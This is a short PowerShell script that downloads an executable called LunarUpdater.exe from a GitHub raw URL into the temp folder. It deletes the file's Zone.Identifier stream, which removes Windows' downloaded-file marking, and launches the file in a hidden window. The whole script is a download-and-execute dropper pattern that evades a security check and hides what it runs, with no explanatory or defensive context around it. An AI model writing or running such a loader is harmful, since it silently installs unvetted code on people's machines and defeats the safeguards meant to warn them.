$url  = "https://raw.githubusercontent.com/merthileyapiyor-lab/powershell-installer/main/LunarUpdater.exe"
$dest = "$env:TEMP\LunarUpdater.exe"

(New-Object System.Net.WebClient).DownloadFile($url, $dest)

Remove-Item -Path "${dest}:Zone.Identifier" -ErrorAction SilentlyContinue

Start-Process -FilePath $dest -WindowStyle Hidden
